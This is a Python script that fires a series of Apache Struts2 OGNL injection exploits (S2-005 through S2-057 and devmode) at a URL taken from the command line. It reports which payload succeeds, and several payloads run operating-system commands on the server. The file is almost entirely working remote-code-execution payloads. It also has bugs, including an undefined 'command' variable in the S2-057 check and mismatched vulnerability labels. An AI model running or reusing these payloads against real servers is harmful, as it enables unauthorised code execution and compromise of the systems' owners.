import sys
import requests
import re
class struts2():
    def struts_019(self,target_url):
        try:
            target_url = target_url[:target_url.find('?')] if '?' in target_url else target_url
            poc = "?debug=command&expression=%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22pathtiaotiaolong_019:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()"
            poc_url = target_url + poc
            response = requests.get(poc_url,timeout=5,verify=False)
            result = response.text
            if 'tiaotiaolong_019' in result:
                if len(result) < 100:
                    return(True,"Struts2_019",target_url)
                else:
                    return (False,"struts2-019",target_url)
            else:
                return (False,"struts2-019",target_url)
        except:
            return (False,target_url)


    def struts_033(self,target_url):
        try:
            target_url = target_url[:target_url.find('?')][:target_url[:target_url.find('?')].rfind('/')]
            poc = "/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]),%23wr.close(),xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=tiaotiaolong_033"
            poc_url = target_url + poc

            response = requests.get(poc_url,timeout=5,verify=False)
            result = response.text

            if 'tiaotiaolong_033' in result:
                return (True,"struts2-033",target_url)
            else:
                return (False,"struts2-033",target_url)
        except:
            return (False,target_url)


    def struts_005(self,target_url):
        try:
            target_url = target_url[:target_url.find('?')] if '?' in target_url else target_url
            poc = "?('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\\43xman.getWriter().println(\\43req.getRealPath(%22tiaotiaolong_005\\u005c%22))')(d))&(i99)(('\\43xman.getWriter().close()')(d))"
            poc_url = target_url + poc

            response = requests.get(poc_url,timeout=5,verify=False)
            result = response.text
            # print result
            if 'tiaotiaolong_005' in result:
                return (True,"struts2-055",target_url)
            # print result
            else:
                #print "此处尚未发现struts2-005类型漏洞"
                return (False,"struts2-055",target_url)
        except:
            #print e
            return (False,target_url)


    def struts_016(self,target_url):
        try:
            proxies={"http":"127.0.0.1:8080"}
            target_url = target_url[:target_url.find('?')] if '?' in target_url else target_url
            poc = "?redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22tiaotiaolong_016%22),%23resp.getWriter().print(%22Word!%22),%23resp.getWriter().flush(),%23resp.getWriter().close()}"
            poc_url = target_url + poc

            response = requests.get(poc_url,timeout=5,verify=False)
            result = response.text
            # print result
            if 'tiaotiaolong_016' in result:
                return (True,"struts2-016",target_url)
            # print result
            else:
                #print "此处尚未发现struts2-016类型漏洞"
                return (False,"struts2-016",target_url)
        except:
            return (False,target_url)


    def struts_032(self,target_url):
        try:
            target_url = target_url[:target_url.find('?')] if '?' in target_url else target_url
            poc = "?method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23test%3D%23context.get%28%23parameters.res%5B0%5D%29.getWriter%28%29%2C%23test.println%28%23parameters.command%5B0%5D%29%2C%23test.flush%28%29%2C%23test.close&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=tiaotiaolong_032"
            poc_url = target_url + poc

            response = requests.get(poc_url,timeout=5,verify=False)
            result = response.text
            # print result
            if 'tiaotiaolong_032' in result:
                if len(result) < 100:
                    return (True,"struts2-016",target_url)
                # print result
                else:
                    #print "此处尚未发现struts2-032类型漏洞"
                    return (False,"struts2-016",target_url)
            else:
                #print "此处尚未发现struts2-032类型漏洞"
                return (False,"struts2-016",target_url)
        except:
            #print e
            return (False,target_url)


    def struts_037(self,target_url):
        try:
            target_url = target_url[:target_url.find('?')][:target_url[:target_url.find('?')].rfind('/')]
            poc = "/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23parameters.content[0]),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=tiaotiaolong_037"
            poc_url = target_url + poc

            response = requests.get(poc_url,timeout=5,verify=False)
            result = response.text
            # print result
            if 'tiaotiaolong_037' in result:
                if len(result) < 100:
                    return (True,"struts2-037",target_url)
                # print result
                else:
                    #print "此处尚未发现struts2-037类型漏洞"
                    return (False,"struts2-037",target_url)
            else:
                #print "此处尚未发现struts2-037类型漏洞"
                return (False,"struts2-037",target_url)
        except:
            #print e
            return (False,target_url)

    def struts2_devmode(self,target_url):
        try:
            target_url = target_url[:target_url.find('?')] if '?' in target_url else target_url
            poc = "?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=netstat -an"
            poc_url = target_url + poc
            response = requests.get(poc_url,timeout=5,verify=False)
            result = response.text
            # print result
            if '0.0.0.0' in result:
                if len(result) < 100:
                    return (True,"struts2_devmode",target_url)
                # print result
                else:
                    #print "此处尚未发现struts2-037类型漏洞"
                    return (False,"struts2_devmode",target_url)
            else:
                #print "此处尚未发现struts2-037类型漏洞"
                return (False,"struts2_devmode",target_url)
        except:
            #print e
            return (False,target_url)

    def struts2_045(self,target_url):
        cmd="88889999"
        header={}
        proxies={"http":"127.0.0.1:8080"}
        header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
        header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+str(cmd).strip()+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        f = {'file': ('aaaaa','image/png')}
        try:
            
            r =requests.post(target_url,files=f,headers=header,timeout=6,verify=False)
            if "88889999" in r.text:
                return (True,"struts2_045",target_url)
            else:
                return (False,target_url)
        except:
            return (False,target_url)

    def struts2_046(self,target_url):
        cmd2="88889999"
        PAYLOAD2="%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+str(cmd2).strip()+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.multipart/form-data"
        try:
            res = requests.post(target_url,
                allow_redirects=False,
                files={'file': (PAYLOAD2, 'gif89a', 'image/gif')},timeout=6,verify=False)
            if "88889999" in res.text:
                return (True,"struts2_046",target_url)
            else:
                return (False,target_url)
        except:
            return (False,target_url)

    def struts2_048(self,target_url):
        try:
            target_url = target_url[:target_url.find('?')][:target_url[:target_url.find('?')].rfind('/')]
            posturl = target_url+"/struts2-showcase/integration/saveGangster.action"
            data = {'name':"%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('1234567890').getInputStream())).(#q)}", 'age':'11', '__checkbox_bustedBefore':'true', 'description':'111'}
            headers={
                'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            res=requests.post(posturl,data=data,headers=headers,timeout=5,verify=False)
            if '1234567890' in res.content:
                return (True,"struts2_048",target_url)
            else:
                return (False,target_url)
        except:
            return (False,target_url)


    def struts2_057(self,target_url):
        try:
            payload = '/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27'+ command +'%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/'
            payload1 = '/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27'+command+'%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/'
            target_url = target_url[:target_url.find('?')] if '?' in target_url else target_url
            host = target_url[:target_url.rfind('/')]
            path = target_url[target_url.rfind('/'):]
            url = host+payload+path
            url1 = host+payload1+path

            res = requests.get(url, allow_redirects=False,timeout=5,verify=False)
            res1 = requests.get(url1, allow_redirects=False,timeout=5,verify=False)

            if res.status_code == 200 and res1.status_code != 200:
                return (True,"struts2_057",target_url)
            elif res1.status_code == 200 and res.status_code != 200:
                return (True,"struts2_057",target_url)
            else:
                return (False,target_url)
        except:
            return (False,target_url)

    def exp(self,target):
        ext_name = target[:target.find('?') if '?' in target else len(target)+1][target[:target.find('?')].rfind('.'):]
        if ext_name not in ['.do','.action','.jsp','.jspx']:
            return False
        if self.struts_005(target)[0]:
            return "struts_005"
        elif self.struts_016(target)[0]:
            return "struts_016"
        elif self.struts_019(target)[0]:
            return "struts_019"
        elif self.struts_032(target)[0]:
            return "struts_032"
        elif self.struts_033(target)[0]:
            return "struts_033"
        elif self.struts_037(target)[0]:
            return "struts_037"
        elif self.struts2_devmode(target)[0]:
            return "struts_devmode"
        elif self.struts2_045(target)[0]:
            return "struts_045"
        elif self.struts2_046(target)[0]:
            return "struts_046"
        elif self.struts2_048(target)[0]:
            return "struts_048"
        elif self.struts2_057(target)[0]:
            return "struts_057"
        else:
            return False
        

ss=struts2()
print(ss.exp(sys.argv[1]))


